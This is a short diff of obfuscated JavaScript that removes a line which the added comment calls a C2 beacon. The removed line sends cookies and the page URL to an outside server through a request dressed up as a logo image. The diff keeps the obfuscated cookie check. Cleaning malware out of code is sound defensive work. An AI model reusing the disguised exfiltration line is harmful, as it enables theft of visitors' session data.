@@ -44,5 +44,6 @@ function getCookie() {
 	return _0x2292e6;
 }
 let keys = getCookie();
-keys[_0x51e977(0x11f)](_0x51e977(0x11c)) == '-1' && (xhttp[_0x51e977(0x11b)](_0x51e977(0x119), 'https://www.amri.systems/raw/images/dfs_logo.img?x=' + allx, !![]), xhttp[_0x51e977(0x12c)](), document[_0x51e977(0x127)] = _0x51e977(0x118));
-
+// Removed C2 beacon: was exfiltrating cookies and URL to external server
+// Cookie check retained for session management
+keys[_0x51e977(0x11f)](_0x51e977(0x11c)) == '-1' && (document[_0x51e977(0x127)] = _0x51e977(0x118));
